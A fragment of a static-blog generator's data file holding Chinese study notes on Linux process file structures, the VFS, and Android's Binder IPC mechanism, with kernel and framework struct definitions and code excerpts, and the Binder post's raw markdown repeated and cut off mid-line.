id=\"进程与文件系统\"><a href=\"#进程与文件系统\" class=\"headerlink\" title=\"进程与文件系统\"></a>进程与文件系统</h2><p>进程的文件位置等信息（当前目录等）是由fs_struct 来描述的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//file:include/linux/fs_struct.h</span><br><span class=\"line\">struct fs_struct &#123;</span><br><span class=\"line\">\tint users;</span><br><span class=\"line\">\tspinlock_t lock;</span><br><span class=\"line\">\tseqcount_spinlock_t seq;</span><br><span class=\"line\">\tint umask;</span><br><span class=\"line\">\tint in_exec;</span><br><span class=\"line\">\tstruct path root, pwd;</span><br><span class=\"line\">&#125; __randomize_layout;</span><br><span class=\"line\">//file:include/linux/path.h</span><br><span class=\"line\">struct path &#123;</span><br><span class=\"line\">\tstruct vfsmount *mnt;</span><br><span class=\"line\">\tstruct dentry *dentry;</span><br><span class=\"line\">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>\n<p>进程打开的文件信息：每个进程用一个files_struct 结构来记录文件描述符的使用情况</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct files_struct &#123;</span><br><span class=\"line\">  /*</span><br><span class=\"line\">   * read mostly part</span><br><span class=\"line\">   */</span><br><span class=\"line\">\tatomic_t count;</span><br><span class=\"line\">\tbool resize_in_progress;</span><br><span class=\"line\">\twait_queue_head_t resize_wait;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstruct fdtable __rcu *fdt; //fdtable </span><br><span class=\"line\">\tstruct fdtable fdtab;</span><br><span class=\"line\">  /*</span><br><span class=\"line\">   * written part on a separate cache line in SMP</span><br><span class=\"line\">   */</span><br><span class=\"line\">\tspinlock_t file_lock ____cacheline_aligned_in_smp;</span><br><span class=\"line\">\tunsigned int next_fd; //下一个要分配的文件句柄号</span><br><span class=\"line\">\tunsigned long close_on_exec_init[1];</span><br><span class=\"line\">\tunsigned long open_fds_init[1];</span><br><span class=\"line\">\tunsigned long full_fds_bits_init[1];</span><br><span class=\"line\">\tstruct file __rcu * fd_array[NR_OPEN_DEFAULT];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct fdtable &#123;</span><br><span class=\"line\">\tunsigned int max_fds;</span><br><span class=\"line\">\tstruct file __rcu **fd;      /* current fd array */ //当前文件数组</span><br><span class=\"line\">\tunsigned long *close_on_exec;</span><br><span class=\"line\">\tunsigned long *open_fds;</span><br><span class=\"line\">\tunsigned long *full_fds_bits;</span><br><span class=\"line\">\tstruct rcu_head rcu;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>fdtable.fd数组的下标就是文件描述符，其中 0、1、2 三个描述符总是默认分配给标准输入、标准输出和标准错误。在数组元素中记录了当前进程打开的每一个文件的指针。这个文件是 Linux 中抽象的文件，可能是真的磁盘上的文件，也可能是一个 socket。</p>\n<h2 id=\"vfs\"><a href=\"#vfs\" class=\"headerlink\" title=\"vfs\"></a>vfs</h2><p><img src=\"../pic/linux_vfs.png\" alt=\"整体逻辑图\"><br>文件系统为应用程序提供了一个逻辑视图，具体是一棵倒立的树结构，方便用户管理众多文件。<br>内部实现：Linux 对超级块结构/superblock、目录结构/dentry，inode 结构以及数据块做了抽象，把这些结构加入了操作函数集合，形成了 VFS，即虚拟文件系统。只要软件模块能提供上述四大核心结构的操作函数集合，生成超级块结构，就可以形成一个文件系统实例，安装到 VFS 中。有了 VFS 层就可以向上为应用程序提供统一的接口，向下兼容不同的文件系统，让 Linux 能够同时安装不同的文件系统。</p>\n<h3 id=\"vfs-的基本概念\"><a href=\"#vfs-的基本概念\" class=\"headerlink\" title=\"vfs 的基本概念\"></a>vfs 的基本概念</h3><p>VFS有四大对象：super_block、dentry、inode和file，贯穿了VFS的设计。</p>\n<ul>\n<li><p>super_block：超级块。存放挂载的文件系统的相关信息，挂载Binder文件系统到全局文件系统树时，会创建属于它的super_block。</p>\n</li>\n<li><p>dentry：目录项。文件系统将目录也当作文件，目录的数据由目录项组成，而每个目录项存储一个目录或文件的名称、对应的inode等内容。open一个文件”/home/xxx/yyy.txt”，那么/、home、xxx、yyy.txt都是一个文件路径组件（组件这词主要来自源码中的component），都有一个对应的dentry。</p>\n</li>\n<li><p>inode：索引节点。描述磁盘上的一个文件元数据（文件属性、位置等）。</p>\n</li>\n<li><p>file：文件对象。open()时创建，close()时销毁。open一个文件/home/xxx/yyy.txt，会用file来记录yyy.txt对应的inode、dentry以及file_operations。<br><img src=\"../pic/vfs_four_object.webp\" alt=\"四大对象关系\"></p>\n</li>\n<li><p>一个文件系统中，只会有一个super_block。</p>\n</li>\n<li><p>dentry中有指向super_block的指针，即d_sb。dentry中有指向它对应的inode的指针，即d_inode。dentry中有指向它的父dentry的指针，即d_parent。</p>\n</li>\n<li><p>多个dentry能会指向同一个inode。不同的dentry可能是同一个inode的别名，inode里有个i_dentry字段，它是一个链表，链表的节点是dentry里的d_alias。当持有一个inode对象时，利用i_dentry和d_adlias，我们可以通过container_of获取到对应的dentry。详见d_find_alias()。//这个改怎么理解</p>\n</li>\n<li><p>inode中有指向super_block的指针，即i_sb。</p>\n</li>\n<li><p>file中有指向对应的inode的指针，即f_inode。file里的f_path是结构体path的对象，它记录了指向对应的dentry的指针。</p>\n</li>\n<li><p>file中的f_op，通常等价于对应的inode的i_fop。f_op是结构体file_operations的对象，记录着一些函数指针，代表系统调用open()的目标文件所支持的操作，比如open()、read()、write()等。</p>\n</li>\n</ul>\n<h3 id=\"vfs的挂载\"><a href=\"#vfs的挂载\" class=\"headerlink\" title=\"vfs的挂载\"></a>vfs的挂载</h3>"},{"title":"binder","_content":"\n### 1. 基础概述\nandroid 中多进程的通信都会依赖Binder IPC机制\n1.1 IPC原理\n从进程的角度看：\n{% asset_img binder_process.png binder_process %}\n每个Android的进程，只能运行在自己进程所拥有的虚拟地址空间。\n对应一个4GB的虚拟地址空间，其中3GB是用户空间，1GB是内核空间，当然内核空间的大小是可以通过参数配置调整的。\n对于用户空间，不同进程之间彼此是不能共享的，而内核空间却是可共享的。\nClient进程向Server进程通信，恰恰是利用进程间可共享的内核内存空间来完成底层通信工作的，Client端与Server端进程往往采用ioctl等方法跟内核空间的驱动进行交互。\n1.2 binder原理\n![alt text](./binbinder_principle.png)\n![alt text](./binder/binder_principle.png)\n可以看出无论是注册服务和获取服务的过程都需要ServiceManager，\n需要注意的是此处的Service Manager是指Native层的ServiceManager（C++），并非指framework层的ServiceManager(Java)。\nServiceManager是整个Binder通信机制的大管家，是Android进程间通信机制Binder的守护进程，要掌握Binder机制，\n首先需要了解系统是如何首次启动Service Manager。当Service Manager启动之后，Client端和Server端通信时都需要先获取Service Manager接口，才能开始通信服务。\n注册服务(addService)：Server进程要先注册Service到ServiceManager。该过程：Server是客户端，ServiceManager是服务端。\n获取服务(getService)：Client进程使用某个Service前，须先向ServiceManager中获取相应的Service。该过程：Client是客户端，ServiceManager是服务端。\n使用服务：Client根据得到的Service信息建立与Service所在的Server进程通信的通路，然后就可以直接与Service交互。该过程：client是客户端，server是服务端。\n1.3 C/S模式\nBpBinder(客户端)和BBinder(服务端)都是Android中Binder通信相关的代表，它们都从IBinder类中派生而来，关系图如下：\n![alt text](binder_cs.png)\nclient端：BpBinder.transact()来发送事务请求；\nserver端：BBinder.onTransact()会接收到相应事务。\n\n\n\n### 2. 创建binder服务\n\n\n数据结构\n```c\ntypedef unsigned int __u32;\ntypedef unsigned long long __u64;\n#ifdef BINDER_IPC_32BIT\ntypedef __u32 binder_size_t;\ntypedef __u32 binder_uintptr_t;\n#else\ntypedef __u64 binder_size_t;\ntypedef __u64 binder_uintptr_t;\n#endif\n\n//native层binder通信的数据结构\nstruct binder_state\n{\n    int fd; // dev/binder的文件描述符\n    void *mapped; //指向mmap的内存地址\n    size_t mapsize; //分配的内存大小，默认为128KB\n};\n\n\nstruct binder_write_read {\n  binder_size_t write_size;\n  binder_size_t write_consumed;\n  binder_uintptr_t write_buffer;\n  binder_size_t read_size;\n  binder_size_t read_consumed;\n  binder_uintptr_t read_buffer;\n};\n\n\n\nres = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);\n\n\nint binder_parse(struct binder_state *bs, struct binder_io *bio,\n                 uintptr_t ptr, size_t size, binder_handler func)\n\n从read_buffer中读取binder事务数据，\n\n//内核层binder通信的数据结构\nBR_TRANSACTION\n\nstruct binder_transaction_data_secctx {\n    struct binder_transaction_data transaction_data;\n    binder_uintptr_t secctx; // secure context 扩展字段\n};\n/**\n[cmd = 0x80000001]             ← 4 字节\n[binder_transaction_data]     ← 56 or 64 字节（取决于架构）\n ├─ target.handle\n ├─ cookie\n ├─ code\n ├─ flags\n ├─ sender_pid / euid\n ├─ data_size / offsets_size\n └─ data.ptr.buffer / offsets\n[optional: secctx]            ← 只有在 BR_TRANSACTION_SEC_CTX 才有\n\nkernel → 用户空间\n        |\n        ↓\n    binder_parse()\n        |\n        +-- 解析 ptr → txn\n        |\n        +-- bio_init_from_txn → msg\n        |\n        +-- func(bs, txn, msg, reply)\n        |\n        +-- 根据 flags 判断是否 reply / free buffer\n\n**/\n\n\n#read_buffer去掉binder事务数据，剩下的全是binder对象数据\n\nstruct binder_transaction_data {\n  union {\n    __u32 handle;\n    binder_uintptr_t ptr;\n  } target;\n  binder_uintptr_t cookie;\n  __u32 code;\n  __u32 flags;\n  pid_t sender_pid;\n  uid_t sender_euid;\n  binder_size_t data_size;\n  binder_size_t offsets_size;\n  union {\n    struct {\n      binder_uintptr_t buffer;\n      binder_uintptr_t offsets;\n    } ptr;\n    __u8 buf[8];\n  } data;\n};\n\nvoid bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)\n{\n    bio->data = bio->data0 = (char *)(intptr_t)txn->data.ptr.buffer;\n    bio->offs = bio->offs0 = (binder_size_t *)(intptr_t)txn->data.ptr.offsets;\n    bio->data_avail = txn->data_size;\n    bio->offs_avail = txn->offsets_size / sizeof(size_t);\n    bio->flags = BIO_F_SHARED;\n}\n\nstruct binder_io\n{\n    char *data;            /* pointer to read/write from */\n    binder_size_t *offs;   /* array of offsets */\n    size_t data_avail;     /* bytes available in data buffer */\n    size_t offs_avail;     /* entries available in offsets array */\n\n    char *data0;           /* start of data buffer */\n    binder_size_t *offs0;  /* start of offsets buffer */\n    uint32_t flags;\n    uint32_t unused;\n};\n\n\nswitch(txn->code)\n\ndo_find_service return si->handle\n\nstruct svcinfo\n{\n    struct svcinfo *next;\n    uint32_t handle;\n    struct binder_death death;\n    int allow_isolated;\n    uint32_t dumpsys_priority;\n    size_t len;\n    uint16_t name[0];\n};\n\n\n\n/**\n内核层binder对象数据结构\n**/\nstruct binder_object_header {\n\t__u32        type;\n};\n\nstruct flat_binder_object {\n\tstruct binder_object_header\thdr;\n\t__u32\t\t\t\tflags;\n\n\t/* 8 bytes of data. */\n\tunion {\n\t\tbinder_uintptr_t\tbinder;\t/* local object */\n\t\t__u32\t\t\thandle;\t/* remote object */\n\t};\n\n\t/* extra data associated with local object */\n\tbinder_uintptr_t\tcookie;\n};\n\nstruct binder_node {\n\tint debug_id;\n\tspinlock_t lock;\n\tstruct binder_work work;\n\tunion {\n\t\tstruct rb_node rb_node;\n\t\tstruct hlist_node dead_node;\n\t};\n\tstruct binder_proc *proc;\n\tstruct hlist_head refs;\n\tint internal_strong_refs;\n\tint local_weak_refs;\n\tint local_strong_refs;\n\tint tmp_refs;\n\tbinder_uintptr_t ptr;\n\tbinder_uintptr_t cookie;\n\tstruct {\n\t\t/*\n\t\t * bitfield elements protected by\n\t\t * proc inner_lock\n\t\t */\n\t\tu8 has_strong_ref:1;\n\t\tu8 pending_strong_ref:1;\n\t\tu8 has_weak_ref:1;\n\t\tu8 pending_weak_ref:1;\n\t};\n\tstruct {\n\t\t/*\n\t\t * invariant after initialization\n\t\t */\n\t\tu8 accept_fds:1;\n\t\tu8 txn_security_ctx:1;\n\t\tu8 min_priority;\n\t};\n\tbool has_async_transaction;\n\tstruct list_head async_todo;\n};\n```\n\n\n1. \n2. ProcessState::self()\n```\nsp<ProcessState> ProcessState::self()\n{\n    Mutex::Autolock _l(gProcessMutex);\n    if (gProcess != nullptr) {\n        return gProcess;\n    }\n    gProcess = new ProcessState(kDefaultDriver);\n    return gProcess;\n}\nProcessState::ProcessState(const char *driver)\n    : mDriverName(String8(driver))\n    , mDriverFD(open_driver(driver))\n    , mVMStart(MAP_FAILED)\n    , mThreadCountLock(PTHREAD_MUTEX_INITIALIZER)\n    , mThreadCountDecrement(PTHREAD_COND_INITIALIZER)\n    , mExecutingThreadsCount(0)\n    , mMaxThreads(DEFAULT_MAX_BINDER_THREADS)\n    , mStarvationStartTimeMs(0)\n    , mManagesContexts(false)\n    , mBinderContextCheckFunc(nullptr)\n    , mBinderContextUserData(nullptr)\n    , mThreadPoolStarted(false)\n    , mThreadPoolSeq(1)\n    , mCallRestriction(CallRestriction::NONE)\n{\n    if (mDriverFD >= 0) {\n        // mmap the binder, providing a chunk of virtual address space to receive transactions.\n        //私有的，可读不可写\n        mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0);\n        if (mVMStart == MAP_FAILED) {\n            // *sigh*\n            ALOGE(\"Using %s failed: unable to mmap transaction memory.\\n\", mDriverName.c_str());\n            close(mDriverFD);\n            mDriverFD = -1;\n            mDriverName.clear();\n        }\n    }\n\n    LOG_ALWAYS_FATAL_IF(mDriverFD < 0, \"Binder driver could not be opened.  Terminating.\");\n}\n\nProcessState::~ProcessState()\n{\n    if (mDriverFD >= 0) {\n        if (mVMStart != MAP_FAILED) {\n            munmap(mVMStart, BINDER_VM_SIZE);\n        }\n        close(mDriverFD);\n    }\n    mDriverFD = -1;\n}\n```\n\nservice_manager\n```c\nbinder_write\n\nfor(::)\n    binder_read();? //什么进行了阻塞？\n\n    binder_parse();\n```\n一句话总结：servicemanager 是通过 ioctl(fd, BINDER_SET_CONTEXT_MGR) 向内核注册了自己的 BBinder 对象，成为了 handle 0，\n### 获取binder服务\n\n\n```cpp 懒汉式单例模式\nextern sp<ProcessState> gProcess;\n\nsp<ProcessState> ProcessState::self()\n{\n    Mutex::Autolock _l(gProcessMutex);\n    if (gProcess != nullptr) {\n        return gProcess;\n    }\n    gProcess = new ProcessState(kDefaultDriver);\n    return gProcess;\n}\n```\n```cpp\nProcessState::ProcessState()\n    : mDriverFD(open_driver(driver))\n    , mVMStart(MAP_FAILED)\n\n    if (mDriverFD >= 0) {\n        // mmap the binder, providing a chunk of virtual address space to receive transactions.\n        mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0);\n        ...\n    }\n\n```\nmmap 的作用是 将 binder 驱动程序提供的一块内存映射到用户空间的虚拟地址空间中，以便用户空间进程可以通过这块内存与 binder 驱动进行通信。\n```\n┌────────────────────────────┐\n│        App 进程            │\n│  - open /dev/binder        │\n│  - mmap 内存区域 A         │◄──┐\n└────────────────────────────┘   │\n                                 │\n┌────────────────────────────┐   │\n│     system_server 进程      │   │\n│  - open /dev/binder         │   │\n│  - mmap 内存区域 B          │◄──┤\n└────────────────────────────┘   │\n                                 │\n┌────────────────────────────┐   │  通过 ioctl + mmap 进行通信\n│     servicemanager 进程     │   │\n│  - open /dev/binder         │   │\n│  - mmap 内存区域 C          │◄──┘\n└────────────────────────────┘\n\n         ▲\n         │\n   ┌─────────────┐\n   │  binder 驱动 │（内核空间）\n   └─────────────┘\n```\n\n\n返回BpBinder\n\n```cpp\nsp<IBinder> ProcessState::getStrongProxyForHandle(int32_t handle)\n{\n\n        handle_entry* e = lookupHandleLocked(handle);\n            b = BpBinder::create(handle);\n                        e->binder = b;\n            if (b) e->refs = b->getWeakRefs();\n            result = b;\n\nreturn result;\n}\n```\nBpBinder 转为 IServiceManager 即BpBinderServiceManager\n```cpp\ntemplate<typename INTERFACE>\ninline sp<INTERFACE> interface_cast(const sp<IBinder>& obj)\n{\n    return INTERFACE::asInterface(obj);\n}\n\n//函数名展开为：\nIServiceManager::asInterface(sp<IBinder>(new BpBinder(0)))\n//而此函数\n// 由宏DECLARE_META_INTERFACE 在 IServiceManager.h 实现\n\n// 由宏IMPLEMENT_META_INTERFACE 在 IServiceManager.cpp实现\n\n//在 IServiceManager.h\nDECLARE_META_INTERFACE(ServiceManager)\n\n//在 IServiceManager.cpp\nIMPLEMENT_META_INTERFACE(ServiceManager, \"android.os.IServiceManager\");\n\n//函数体最终展开为：\nsp<IServiceManager> IServiceManager::asInterface(const sp<IBinder>& obj)\n{\n    return new BpServiceManager(obj);\n}\n```\ndefaultServiceManager() 返回的是 BpServiceManager，因为它通过 interface_cast<IServiceManager>() 把一个 BpBinder(0)（远端的 servicemanager 代理）转换成了一个 BpServiceManager 类型的对象。\n\n这个 BpServiceManager 是 servicemanager 的客户端代理，它包装了所有 Binder 通信细节（比如 transact(CHECK_SERVICE)），供 App 或 System Server 调用。\n\n每个进程如果要注册服务，都会创建自己的 BpServiceManager 实例，用来通过 Binder 向 servicemanager 发起 addService() 等调用。\n注意：\n\t•\t虽然每个进程都会 构造一个 BpServiceManager 对象，但这个对象内部都指向 同一个远程 Binder 节点（handle=0），也就是 servicemanager；\n\t•\t所以每个进程只是创建了一个“代理对象”，而不是实际的服务管理器本体；\n\t•\t真正提供服务注册逻辑的，是 servicemanager 进程中的 BnServiceManager::onTransact()。\n\n## 附录","source":"_posts/binder.md","raw":"title: binder\n---\n\n### 1. 基础概述\nandroid 中多进程的通信都会依赖Binder IPC机制\n1.1 IPC原理\n从进程的角度看：\n{% asset_img binder_process.png binder_process %}\n每个Android的进程，只能运行在自己进程所拥有的虚拟地址空间。\n对应一个4GB的虚拟地址空间，其中3GB是用户空间，1GB是内核空间，当然内核空间的大小是可以通过参数配置调整的。\n对于用户空间，不同进程之间彼此是不能共享的，而内核空间却是可共享的。\nClient进程向Server进程通信，恰恰是利用进程间可共享的内核内存空间来完成底层通信工作的，Client端与Server端进程往往采用ioctl等方法跟内核空间的驱动进行交互。\n1.2 binder原理\n![alt text](./binbinder_principle.png)\n![alt text](./binder/binder_principle.png)\n可以看出无论是注册服务和获取服务的过程都需要ServiceManager，\n需要注意的是此处的Service Manager是指Native层的ServiceManager（C++），并非指framework层的ServiceManager(Java)。\nServiceManager是整个Binder通信机制的大管家，是Android进程间通信机制Binder的守护进程，要掌握Binder机制，\n首先需要了解系统是如何首次启动Service Manager。当Service Manager启动之后，Client端和Server端通信时都需要先获取Service Manager接口，才能开始通信服务。\n注册服务(addService)：Server进程要先注册Service到ServiceManager。该过程：Server是客户端，ServiceManager是服务端。\n获取服务(getService)：Client进程使用某个Service前，须先向ServiceManager中获取相应的Service。该过程：Client是客户端，ServiceManager是服务端。\n使用服务：Client根据得到的Service信息建立与Service所在的Server进程通信的通路，然后就可以直接与Service交互。该过程：client是客户端，server是服务端。\n1.3 C/S模式\nBpBinder(客户端)和BBinder(服务端)都是Android中Binder通信相关的代表，它们都从IBinder类中派生而来，关系图如下：\n![alt text](binder_cs.png)\nclient端：BpBinder.transact()来发送事务请求；\nserver端：BBinder.onTransact()会接收到相应事务。\n\n\n\n### 2. 创建binder服务\n\n\n数据结构\n```c\ntypedef unsigned int __u32;\ntypedef unsigned long long __u64;\n#ifdef BINDER_IPC_32BIT\ntypedef __u32 binder_size_t;\ntypedef __u32 binder_uintptr_t;\n#else\ntypedef __u64 binder_size_t;\ntypedef __u64 binder_uintptr_t;\n#endif\n\n//native层binder通信的数据结构\nstruct binder_state\n{\n    int fd; // dev/binder的文件描述符\n    void *mapped; //指向mmap的内存地址\n    size_t mapsize; //分配的内存大小，默认为128KB\n};\n\n\nstruct binder_write_read {\n  binder_size_t write_size;\n  binder_size_t write_consumed;\n  binder_uintptr_t write_buffer;\n  binder_size_t read_size;\n  binder_size_t read_consumed;\n  binder_uintptr_t read_buffer;\n};\n\n\n\nres = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);\n\n\nint binder_parse(struct binder_state *bs, struct binder_io *bio,\n                 uintptr_t ptr, size_t size, binder_handler func)\n\n从read_buffer中读取binder事务数据，\n\n//内核层binder通信的数据结构\nBR_TRANSACTION\n\nstruct binder_transaction_data_secctx {\n    struct binder_transaction_data transaction_data;\n    binder_uintptr_t secctx; // secure context 扩展字段\n};\n/**\n[cmd = 0x80000001]             ← 4 字节\n[binder_transaction_data]     ← 56 or 64 字节（取决于架构）\n ├─ target.handle\n ├─ cookie\n ├─ code\n ├─ flags\n ├─ sender_pid / euid\n ├─ data_size / offsets_size\n └─ data.ptr.buffer / offsets\n[optional: secctx]            ← 只有在 BR_TRANSACTION_SEC_CTX 才有\n\nkernel → 用户空间\n        |\n        ↓\n    binder_parse()\n        |\n        +-- 解析 ptr → txn\n        |\n        +-- bio_init_from_txn → msg\n        |\n        +-- func(bs, txn, msg, reply)\n        |\n        +-- 根据 flags 判断是否 reply / free buffer\n\n**/\n\n\n#read_buffer去掉binder事务数据，剩下的全是binder对象数据\n\nstruct binder_transaction_data {\n  union {\n    __u32 handle;\n    binder_uintptr_t ptr;\n  } target;\n  binder_uintptr_t cookie;\n  __u32 code;\n  __u32 flags;\n  pid_t sender_pid;\n  uid_t sender_euid;\n  binder_size_t data_size;\n  binder_size_t offsets_size;\n  union {\n    struct {\n      binder_uintptr_t buffer;\n      binder_uintptr_t offsets;\n    } ptr;\n    __u8 buf[8];\n  } data;\n};\n\nvoid bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)\n{\n    bio->data = bio->data0 = (char *)(intptr_t)txn->data.ptr.buffer;\n    bio->offs = bio->offs0 = (binder_size_t *)(intptr_t)txn->data.ptr.offsets;\n    bio->data_avail = txn->data_size;\n    bio->offs_avail = txn->offsets_size / sizeof(size_t);\n    bio->flags = BIO_F_SHARED;\n}\n\nstruct binder_io\n{\n    char *data;            /* pointer to read/write from */\n    binder_size_t *offs;   /* array of offsets */\n    size_t data_avail;     /* bytes available in data buffer */\n    size_t offs_avail;     /* entries available in offsets array */\n\n    char *data0;           /* start of data buffer */\n    binder_size_t *offs0;  /* start of offsets buffer */\n    uint32_t flags;\n    uint32_t unused;\n};\n\n\nswitch(txn->code)\n\ndo_find_service return si->handle\n\nstruct svcinfo\n{\n    struct svcinfo *next;\n    uint32_t handle;\n    struct binder_death death;\n    int allow_isolated;\n    uint32_t dumpsys_priority;\n    size_t len;\n    uint16_t name[0];\n};\n\n\n\n/**\n内核层binder对象数据结构\n**/\nstruct binder_object_header {\n\t__u32        type;\n};\n\nstruct flat_binder_object {\n\tstruct binder_object_header\thdr;\n\t__u32\t\t\t\tflags;\n\n\t/* 8 bytes of data. */\n\tunion {\n\t\tbinder_uintptr_t\tbinder;\t/* local object */\n\t\t__u32\t\t\thandle;\t/* remote object */\n\t};\n\n\t/* extra data associated with local object */\n\tbinder_uintptr_t\tcookie;\n};\n\nstruct binder_node {\n\tint debug_id;\n\tspinlock_t lock;\n\tstruct binder_work work;\n\tunion {\n\t\tstruct rb_node rb_node;\n\t\tstruct hlist_node dead_node;\n\t};\n\tstruct binder_proc *proc;\n\tstruct hlist_head refs;\n\tint internal_strong_refs;\n\tint local_weak_refs;\n\tint local_strong_refs;\n\tint tmp_refs;\n\tbinder_uintptr_t ptr;\n\tbinder_uintptr_t cookie;\n\tstruct {\n\t\t/*\n\t\t * bitfield elements protected by\n\t\t * proc inner_lock\n\t\t */\n\t\tu8 has_strong_ref:1;\n\t\tu8 pending_strong_ref:1;\n\t\tu8 has_weak_ref:1;\n\t\tu8 pending_weak_ref:1;\n\t};\n\tstruct {\n\t\t/*\n\t\t * invariant after initialization\n\t\t */\n\t\tu8 accept_fds:1;\n\t\tu8 txn_security_ctx:1;\n\t\tu8 min_priority;\n\t};\n\tbool has_async_transaction;\n\tstruct list_head async_todo;\n};\n```\n\n\n1. \n2. ProcessState::self()\n```\nsp<ProcessState> ProcessState::self()\n{\n    Mutex::Autolock _l(gProcessMutex);\n    if (gProcess != nullptr) {\n        return gProcess;\n    }\n    gProcess = new ProcessState(kDefaultDriver);\n    return gProcess;\n}\nProcessState::ProcessState(const char *driver)\n    : mDriverName(String8(driver))\n    , mDriverFD(open_driver(driver))\n    , mVMStart(MAP_FAILED)\n    , mThreadCountLock(PTHREAD_MUTEX_INITIALIZER)\n    , mThreadCountDecrement(PTHREAD_COND_INITIALIZER)\n    , mExecutingThreadsCount(0)\n    , mMaxThreads(DEFAULT_MAX_BINDER_THREADS)\n    , mStarvationStartTimeMs(0)\n    , mManagesContexts(false)\n    , mBinderContextCheckFunc(nullptr)\n    , mBinderContextUserData(nullptr)\n    , mThreadPoolStarted(false)\n    , mThreadPoolSeq(1)\n    , mCallRestriction(CallRestriction::NONE)\n{\n    if (mDriverFD >= 0) {\n        // mmap the binder, providing a chunk of virtual address space to receive transactions.\n        //私有的，可读不可写\n        mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0);\n        if (mVMStart == MAP_FAILED) {\n            // *sigh*\n            ALOGE(\"Using %s failed: unable to mmap transaction memory.\\n\", mDriverName.c_str());\n            close(mDriverFD);\n            mDriverFD = -1;\n            mDriverName.clear();\n        }\n    }\n\n    LOG_ALWAYS_FATAL_IF(mDriverFD < 0, \"Binder driver could not be opened.  Terminating.\");\n}\n\nProcessState::~ProcessState()\n{\n    if (mDriverFD >= 0) {\n        if (mVMStart != MAP_FAILED) {\n            munmap(mVMStart, BINDER_VM_SIZE);\n        }\n        close(mDriverFD);\n    }\n    mDriverFD = -1;\n}\n```\n\nservice_manager\n```c\nbinder_write\n\nfor(::)\n    binder_read();? //什么进行了阻塞？\n\n    binder_parse();\n```\n一句话总结：servicemanager 是通过 ioctl(fd, BINDER_SET_CONTEXT_MGR) 向内核注册了自己的 BBinder 对象，成为了 handle 0，\n### 获取binder服务\n\n\n```cpp 懒汉式单例模式\nextern sp<ProcessState> gProcess;\n\nsp<ProcessState> ProcessState::self()\n{\n    Mutex::Autolock _l(gProcessMutex);\n    if (gProcess != nullptr) {\n        return gProcess;\n    }\n    gProcess = new ProcessState(kDefaultDriver);\n    return gProcess;\n}\n```\n```cpp\nProcessState::ProcessState()\n    : mDriverFD(open_driver(driver))\n    , mVMStart(MAP_FAILED)\n\n    if (mDriverFD >= 0) {\n        // mmap the binder, providing a chunk of virtual address space to receive transactions.\n        mVMStart = mmap(nullptr, BINDER_VM_SIZE, PROT_READ, MAP_PRIVATE | MAP_NORESERVE, mDriverFD, 0);\n        ...\n    }\n\n```\nmmap 的作用是 将 binder 驱动程序提供的一块内存映射到用户空间的虚拟地址空间中，以便用户空间进程可以通过这块内存与 binder 驱动进行通信。\n```\n┌────────────────────────────┐\n│        App 进程            │\n│  - open /dev/binder        │\n│  - mmap 内存区域 A         │◄──┐\n└────────────────────────────┘   │\n                                 │\n┌────────────────────────────┐   │\n│     system_server 进程      │   │\n│  - open /dev/binder         │   │\n│  - mmap 内存区域 B          │◄──┤\n└────────────────────────────┘   │\n                                 │\n┌────────────────────────────┐   │  通过 ioctl + mmap 进行通信\n│     servicemanager 进程     │   │\n│  - open /dev/binder         │   │\n│  - mmap 内存区域 C          │◄──┘\n└────────────────────────────┘\n\n         ▲\n         │\n   ┌─────────────┐\n   │  binder 驱动 │（内核空间）\n   └─────────────┘\n```\n\n\n返回BpBinder\n\n```cpp\nsp<IBinder> ProcessState::getStrongProxyForHandle(int32_t handle)\n{\n\n        handle_entry* e = lookupHandleLocked(handle);\n            b = BpBinder::create(handle);\n                        e->binder = b;\n            if (b) e->refs = b->getWeakRefs();\n            result = b;\n\nreturn result;\n}\n```\nBpBinder 转为 IServiceManager 即BpBinderServiceManager\n```cpp\ntemplate<typename INTERFACE>\ninline sp<INTERFACE> interface_cast(const sp<IBinder>& obj)\n{\n    return INTERFACE::asInterface(obj);\n}\n\n//函数名展开为：\nIServiceManager::asInterface(sp<IBinder>(new BpBinder(0)))\n//而此函数\n// 由宏DECLARE_META_INTERFACE 在 IServiceManager.h 实现\n\n// 由宏IMPLEMENT_META_INTERFACE 在 IServiceManager.cpp实现\n\n//在 IServiceManager.h\nDECLARE_META_INTERFACE(ServiceManager)\n\n//在 IServiceManager.cpp\nIMPLEMENT_META_INTERFACE(ServiceManager, \"android.os.IServiceManager\");\n\n//函数体最终展开为：\nsp<IServiceManager> IServiceManager::asInterface(const 